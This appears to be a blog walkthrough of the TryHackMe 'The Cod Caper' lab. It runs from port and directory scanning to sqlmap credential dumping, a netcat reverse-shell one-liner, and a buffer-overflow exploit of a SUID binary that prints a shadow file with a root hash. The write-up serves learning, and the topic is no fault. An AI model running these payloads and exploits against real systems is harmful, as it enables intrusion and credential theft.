<!doctype html>
<html lang="en-us">
  <head>
    <title>THM - The Cod Caper // chrootcommit</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.124.1">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="chrootcommit" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.4743f052c32dac5ef397f32c14bda832463022dc1f4b64e6f4bebd125456947c.css" />
    

    
    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="THM - The Cod Caper"/>
<meta name="twitter:description" content="Host Enumeration ┌──(kali㉿kali)-[~] └─$ sudo nmap -p- -v 10.10.10.196 -A Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 12:34 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 12:34 Completed NSE at 12:34, 0.00s elapsed Initiating NSE at 12:34 Completed NSE at 12:34, 0.00s elapsed Initiating NSE at 12:34 Completed NSE at 12:34, 0.00s elapsed Initiating Ping Scan at 12:34 Scanning 10.10.10.196 [4 ports] Completed Ping Scan at 12:34, 0."/>

    <meta property="og:title" content="THM - The Cod Caper" />
<meta property="og:description" content="Host Enumeration ┌──(kali㉿kali)-[~] └─$ sudo nmap -p- -v 10.10.10.196 -A Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 12:34 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 12:34 Completed NSE at 12:34, 0.00s elapsed Initiating NSE at 12:34 Completed NSE at 12:34, 0.00s elapsed Initiating NSE at 12:34 Completed NSE at 12:34, 0.00s elapsed Initiating Ping Scan at 12:34 Scanning 10.10.10.196 [4 ports] Completed Ping Scan at 12:34, 0." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://chrootcommit.github.io/posts/thm-the_code_caper/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-04-12T15:20:21-04:00" />
<meta property="article:modified_time" content="2023-04-12T15:20:21-04:00" />


  </head>
  <body>
    <header class="app-header">
      <a href="https://chrootcommit.github.io/"><img class="app-header-avatar" src="/profile.png" alt="chrootcommit" /></a>
      <span class="app-header-title">chrootcommit</span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/posts/about">About</a>
            -
          
          <a class="app-header-menu-item" href="/">Home</a>
            -
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      <p>Junior Cybersecurity Consultant.</p>
      <div class="app-header-social">
        
          <a href="https://github.com/ChRootCommit" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">THM - The Cod Caper</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Apr 12, 2023
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          5 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <h1 id="host-enumeration">Host Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo nmap -p- -v  10.10.10.196 -A
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-12 12:34 EDT
</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">155</span> scripts <span style="color:#66d9ef">for</span> scanning.
</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning.
</span></span><span style="display:flex;"><span>Initiating NSE at 12:34
</span></span><span style="display:flex;"><span>Completed NSE at 12:34, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating NSE at 12:34
</span></span><span style="display:flex;"><span>Completed NSE at 12:34, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating NSE at 12:34
</span></span><span style="display:flex;"><span>Completed NSE at 12:34, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating Ping Scan at 12:34
</span></span><span style="display:flex;"><span>Scanning 10.10.10.196 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Completed Ping Scan at 12:34, 0.07s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 12:34
</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 12:34, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:34
</span></span><span style="display:flex;"><span>Scanning 10.10.10.196 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 10.10.10.196
</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.196
</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:35, 30.90s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Initiating Service scan at 12:35
</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">2</span> services on 10.10.10.196
</span></span><span style="display:flex;"><span>Completed Service scan at 12:35, 6.18s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">2</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Initiating OS detection <span style="color:#f92672">(</span>try <span style="color:#75715e">#1) against 10.10.10.196</span>
</span></span><span style="display:flex;"><span>Retrying OS detection <span style="color:#f92672">(</span>try <span style="color:#75715e">#2) against 10.10.10.196</span>
</span></span><span style="display:flex;"><span>Retrying OS detection <span style="color:#f92672">(</span>try <span style="color:#75715e">#3) against 10.10.10.196</span>
</span></span><span style="display:flex;"><span>Retrying OS detection <span style="color:#f92672">(</span>try <span style="color:#75715e">#4) against 10.10.10.196</span>
</span></span><span style="display:flex;"><span>Retrying OS detection <span style="color:#f92672">(</span>try <span style="color:#75715e">#5) against 10.10.10.196</span>
</span></span><span style="display:flex;"><span>Initiating Traceroute at 12:35
</span></span><span style="display:flex;"><span>Completed Traceroute at 12:35, 0.04s elapsed
</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">2</span> hosts. at 12:35
</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">2</span> hosts. at 12:35, 0.00s elapsed
</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.10.196.
</span></span><span style="display:flex;"><span>Initiating NSE at 12:35
</span></span><span style="display:flex;"><span>Completed NSE at 12:35, 1.28s elapsed
</span></span><span style="display:flex;"><span>Initiating NSE at 12:35
</span></span><span style="display:flex;"><span>Completed NSE at 12:35, 0.15s elapsed
</span></span><span style="display:flex;"><span>Initiating NSE at 12:35
</span></span><span style="display:flex;"><span>Completed NSE at 12:35, 0.01s elapsed
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.196
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.035s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 6d2c401b6c157cfcbf9b5522612a56fc <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> ff893298f4779c0939f5af4a4f08d6f5 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>TCP/IP fingerprint:
</span></span><span style="display:flex;"><span>OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.93%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>4/12%OT<span style="color:#f92672">=</span>22%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>30182%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>T%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span>6436DDE
</span></span><span style="display:flex;"><span>OS:3%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>FE%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>10E%TI<span style="color:#f92672">=</span>Z%CI<span style="color:#f92672">=</span>I%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>8<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>OS:O1<span style="color:#f92672">=</span>M508ST11NW7%O2<span style="color:#f92672">=</span>M508ST11NW7%O3<span style="color:#f92672">=</span>M508NNT11NW7%O4<span style="color:#f92672">=</span>M508ST11NW7%O5<span style="color:#f92672">=</span>M508ST11
</span></span><span style="display:flex;"><span>OS:NW7%O6<span style="color:#f92672">=</span>M508ST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span>68DF%W2<span style="color:#f92672">=</span>68DF%W3<span style="color:#f92672">=</span>68DF%W4<span style="color:#f92672">=</span>68DF%W5<span style="color:#f92672">=</span>68DF%W6<span style="color:#f92672">=</span>68DF<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>OS:R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>6903%O<span style="color:#f92672">=</span>M508NNSNW7%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS
</span></span><span style="display:flex;"><span>OS:%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>N<span style="color:#f92672">)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>OS:Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>Z%F<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>OS:R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>40%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T
</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=</span>40%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>40%CD<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>OS:S<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Uptime guess: 198.840 days <span style="color:#f92672">(</span>since Sun Sep <span style="color:#ae81ff">25</span> 16:25:38 2022<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>TCP Sequence Prediction: Difficulty<span style="color:#f92672">=</span><span style="color:#ae81ff">254</span> <span style="color:#f92672">(</span>Good luck!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>IP ID Sequence Generation: All zeros
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 143/tcp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   35.64 ms 10.8.0.1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   35.75 ms 10.10.10.196
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NSE: Script Post-scanning.
</span></span><span style="display:flex;"><span>Initiating NSE at 12:35
</span></span><span style="display:flex;"><span>Completed NSE at 12:35, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating NSE at 12:35
</span></span><span style="display:flex;"><span>Completed NSE at 12:35, 0.00s elapsed
</span></span><span style="display:flex;"><span>Initiating NSE at 12:35
</span></span><span style="display:flex;"><span>Completed NSE at 12:35, 0.00s elapsed
</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 51.84 seconds
</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">66018</span> <span style="color:#f92672">(</span>2.909MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65631</span> <span style="color:#f92672">(</span>2.636MB<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>How many ports are open on the target machine? 2</p>
<p>What is the http-title of the web server? Apache2 Ubuntu Default Page: It works</p>
<p>What is the version of the web server?  Apache/2.4.18</p>
<h1 id="web-enumeration-">Web enumeration :</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo gobuster dir -u http://10.10.10.196/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,json,txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.5
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.196/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.5
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              html,php,json,txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2023/04/12 12:43:38 Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 277<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10918<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/administrator.php    <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 409<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>What is the name of the important file on the server? administrator.php</p>
<h1 id="web-exploitation-">Web Exploitation :</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u http://10.10.10.196/administrator.php --forms --dump  
</span></span><span style="display:flex;"><span>+------------+----------+
</span></span><span style="display:flex;"><span>| password   | username |
</span></span><span style="display:flex;"><span>+------------+----------+
</span></span><span style="display:flex;"><span>| secretpass | pingudad |
</span></span><span style="display:flex;"><span>+------------+----------+
</span></span></code></pre></div><p>What is the admin username? pingudad</p>
<p>What is the admin password? secretpass</p>
<p>How many forms of SQLI is the form vulnerable to? 3</p>
<h1 id="command-injection-">Command Injection :</h1>
<p>Revershell :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.8.14.241 <span style="color:#ae81ff">9001</span> &gt;/tmp/f
</span></span></code></pre></div><p>I tried to connect using id_rsa, but the it continue to ask me password. Then, I searched the password throught the find command :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name pass* -type f
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pingu@ubuntu:~$ cat /var/hidden/pass 
</span></span><span style="display:flex;"><span>pinguapingu
</span></span></code></pre></div><p>How many files are in the current directory? 3</p>
<p>Do I still have an account? yes</p>
<p>What is my ssh password? pinguapingu</p>
<h1 id="binary-exploitation">Binary Exploitation</h1>
<p>I manually found the /opt/secrets/root file by exploring the /opt folder after getting loged as pingu :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-r-sr-xr-x <span style="color:#ae81ff">1</span> root  papa  <span style="color:#ae81ff">7516</span> Jan <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> root
</span></span></code></pre></div><p>THM provides us the source code :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;unistd.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;stdio.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;stdlib.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">shell</span>(){
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">setgid</span>(<span style="color:#ae81ff">1000</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /var/backups/shadow.bak&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">get_input</span>(){
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">32</span>];
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,buffer);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">get_input</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Here, it is a vulnerable file to buffer overflow. Our goal is to  overwrite the eip with the shell function address.</p>
<p>I tested the pwntool cyclic module with gdb .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cyclic <span style="color:#ae81ff">200</span> &gt; attack
</span></span></code></pre></div><p><img src="/cod_caper/rewrite_eip.png" alt="">
Ok let&rsquo;s generate the padding characteres before the laaa string. I used python interpreter and executeed following commandes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;&gt;&gt; from pwn import *
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; print cyclic<span style="color:#f92672">(</span>cyclic_find<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;laaa&#39;</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
</span></span><span style="display:flex;"><span>&gt;&gt;&gt; len<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">44</span>
</span></span></code></pre></div><p>Ok, we need 44 padding char before overwriting our eip with the shell function address. Let&rsquo;s get the shell function address :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non-debugging symbols:
</span></span><span style="display:flex;"><span>0x08048330  _init
</span></span><span style="display:flex;"><span>0x08048370  setgid@plt
</span></span><span style="display:flex;"><span>0x08048380  system@plt
</span></span><span style="display:flex;"><span>0x08048390  __libc_start_main@plt
</span></span><span style="display:flex;"><span>0x080483a0  setuid@plt
</span></span><span style="display:flex;"><span>0x080483b0  __isoc99_scanf@plt
</span></span><span style="display:flex;"><span>0x080483d0  _start
</span></span><span style="display:flex;"><span>0x08048400  __x86.get_pc_thunk.bx
</span></span><span style="display:flex;"><span>0x08048410  deregister_tm_clones
</span></span><span style="display:flex;"><span>0x08048440  register_tm_clones
</span></span><span style="display:flex;"><span>0x08048480  __do_global_dtors_aux
</span></span><span style="display:flex;"><span>0x080484a0  frame_dummy
</span></span><span style="display:flex;"><span>0x080484cb  shell
</span></span><span style="display:flex;"><span>0x08048504  get_input
</span></span><span style="display:flex;"><span>0x08048521  main
</span></span><span style="display:flex;"><span>0x08048550  __libc_csu_init
</span></span><span style="display:flex;"><span>0x080485b0  __libc_csu_fini
</span></span><span style="display:flex;"><span>0x080485b4  _fini
</span></span><span style="display:flex;"><span>pwndbg&gt; 
</span></span></code></pre></div><p>shell function address is 0x080484cb which is &ldquo;\xcb\x84\x04\x08&rdquo; in shellcode.</p>
<p>Let&rsquo;s exploit the buffer overflow :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pingu@ubuntu:/opt/secret$ python -c <span style="color:#e6db74">&#39;print &#34;A&#34;*44+&#34;\xcb\x84\x04\x08&#34;&#39;</span> | ./root
</span></span><span style="display:flex;"><span>root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
</span></span><span style="display:flex;"><span>daemon:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>bin:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>sys:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>sync:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>games:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>man:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>lp:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>mail:*:17953:0:99999:7:::
</span></span><span style="display:flex;"><span>news:*:17953:0:99999:7:::
